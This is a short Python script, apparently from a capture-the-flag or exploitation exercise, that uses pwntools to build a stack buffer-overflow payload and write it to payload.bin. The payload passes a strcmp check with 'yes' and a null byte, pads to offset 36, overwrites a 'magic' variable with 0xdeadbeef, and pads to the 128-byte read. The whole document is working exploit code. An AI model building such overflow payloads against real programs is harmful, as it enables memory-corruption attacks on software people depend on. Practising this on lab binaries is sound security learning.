from pwn import *

payload  = b"yes\x00"           # first part to pass strcmp
payload += b"A" * (36 - len(payload))
payload += p32(0xdeadbeef)           # Overwrite magic
payload += b"B" * (128 - len(payload))  # Pad to match read(128)

with open("payload.bin", "wb") as f:
    f.write(payload)

